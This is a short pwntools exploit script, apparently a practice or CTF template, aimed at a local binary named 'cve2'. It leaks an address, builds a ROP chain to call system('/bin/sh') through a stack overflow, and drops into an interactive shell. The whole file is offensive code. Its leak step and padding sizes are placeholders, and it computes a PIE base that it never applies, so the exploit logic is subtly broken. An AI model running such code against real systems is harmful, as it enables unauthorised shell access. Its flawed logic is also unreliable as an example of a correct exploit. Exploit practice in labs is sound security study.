from pwn import *
# Set up pwntools for the correct architecture
context.binary = './cve/cve-2/cve2'
elf = context.binary

# Start the process
p = process(elf.path)

# Step 1: Leak a PIE base address
# Assuming there is a vulnerability to leak an address (e.g., format string or buffer overflow)
# Replace this with the actual method to leak an address
leak_payload = b'A' * 64  # Adjust the payload size as needed
p.sendline(leak_payload)

# Receive the leaked address
leaked_data = p.recvline()
leaked_address = u64(leaked_data.strip().ljust(8, b'\x00'))

# Calculate the PIE base address
pie_base = leaked_address - elf.symbols['main']
log.info(f"PIE base address: {hex(pie_base)}")

# Step 2: Build the ROP chain
rop = ROP(elf)

# Find the '/bin/sh' string in the binary
bin_sh = next(elf.search(b'/bin/sh'))

# Use the 'system' function to execute '/bin/sh'
system = elf.plt['system']

# Add the ROP chain
rop.call(system, [bin_sh])
log.info(f"ROP chain: {rop.dump()}")

# Step 3: Exploit the vulnerability
# Adjust the payload size to overwrite the return address
payload = b'A' * 64  # Adjust the size as needed
payload += rop.chain()

# Send the payload
p.sendline(payload)

# Step 4: Interact with the shell
p.interactive()
